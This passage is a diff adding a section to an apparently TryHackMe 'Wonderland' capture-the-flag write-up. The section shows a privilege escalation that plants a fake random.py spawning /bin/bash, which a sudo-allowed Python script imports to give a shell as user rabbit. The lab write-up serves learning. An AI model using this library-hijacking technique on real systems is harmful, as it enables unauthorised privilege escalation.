@@ -303,3 +303,21 @@ alice@wonderland:/root$ cat user.txt
 thm{"Curiouser and curiouser!"}
 alice@wonderland:/root$ 
 ```
+
+Had a break and conversed on a plan to priv esc from the walrus script. Create a custom random and /bin/bash to rabbit considering I can't write on walrus. User alice can run /usr/bin/python3.6 on wonderland so we do this.
+
+```bash
+alice@wonderland:~$ nano random.py 
+alice@wonderland:~$ cat random.py 
+import os
+os.system("/bin/bash")
+alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+[sudo] password for alice: 
+Sorry, try again.
+[sudo] password for alice: 
+rabbit@wonderland:~$ whoami
+rabbit
+```
+
+
+
